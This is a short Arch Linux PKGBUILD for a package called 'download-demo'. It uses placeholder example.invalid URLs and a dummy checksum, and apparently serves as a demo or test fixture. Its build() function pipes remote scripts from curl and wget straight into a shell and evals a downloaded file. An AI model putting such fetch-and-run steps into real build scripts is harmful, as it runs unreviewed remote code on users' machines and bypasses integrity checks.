pkgname=download-demo
pkgver=1.0
pkgrel=1
arch=('x86_64')
url="https://example.invalid/download-demo"
source=("https://example.invalid/download-demo.tar.gz")
sha256sums=('b1946ac92492d2347c6235b4d2611184b1946ac92492d2347c6235b4d2611184')

build() {
  curl -fsSL https://example.invalid/install.sh | bash
  wget -qO- https://example.invalid/tool.sh | sh
  eval "$(curl -fsSL https://example.invalid/env.sh)"
}
